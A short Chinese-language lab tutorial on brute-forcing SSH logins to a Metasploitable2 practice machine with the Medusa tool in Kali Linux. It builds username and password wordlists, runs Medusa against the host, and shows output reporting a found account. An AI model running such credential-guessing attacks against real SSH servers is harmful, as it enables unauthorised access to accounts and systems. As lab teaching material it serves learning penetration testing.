## 使用Medusa暴力破解ssh账号密码

1. 进入kali系统
2. 系统本身自带了这个工具， 在应用程序-Kali Linux-密码攻击-在线攻击-medusa
3. 打开后会进入shell终端，显示的是medusa的帮助
4. 先生成用户和密码文件，这个取决于自己，可以生成N个密码和账户，挨着去测试。
5. 本身我们就知道metasploitable2的账号密码，作为测试就生成这几个就可以了。
```bash
[root@kali: ~#] echo -e "msfadmin\nroot\nuser\npostgres\nsys\nklog\nservice" >> user.txt
[root@kali: ~#] echo -e "1234567\nmeiyoumima\nuser\n123456789\nmsfadmin\npostgres\nbatman\nservice" >> passwd.txt
[root@kali: ~#] cat user.txt
msfadmin
root
user
postgres
sys
klog
service
[root@kali: ~#] cat passwd.txt
1234567
meiyoumima
user
123456789
msfadmin
postgres
batman
service
#用户和密码文件都生成了
#开始用medusa暴力破解
root@kali:~# medusa -h metasploitable2 -U user.txt -P passwd.txt -M ssh

ACCOUNT CHECK: [ssh] Host: metasploitable2 (1 of 1, 0 complete) User: msfadmin (1 of 7, 0 complete) Password: 1234567 (1 of 8 complete)
ACCOUNT CHECK: [ssh] Host: metasploitable2 (1 of 1, 0 complete) User: msfadmin (1 of 7, 0 complete) Password: meiyoumima (2 of 8 complete)
ACCOUNT FOUND: [ssh] Host: metasploitable2 User: msfadmin Password: meiyoumima [SUCCESS]
```
6. 以上就是medusa的基本使用方式，最后得到结果，可以加上`-O`把成功的
用户密码输出到日志文件中，更多使用方式请查看`medusa --help`